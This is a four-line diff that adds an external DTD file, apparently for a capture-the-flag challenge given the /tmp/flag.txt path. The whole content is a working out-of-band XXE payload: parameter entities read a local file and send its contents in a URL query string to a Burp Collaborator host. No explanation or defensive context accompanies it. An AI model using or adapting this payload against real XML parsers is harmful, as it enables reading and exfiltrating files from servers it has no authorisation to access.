@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "/tmp/flag.txt">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ap3im7ouzx1qfoe54gj6kp7nkeq8ex.burpcollaborator.net?x=%file;'>">
+%eval;
+%exfil;
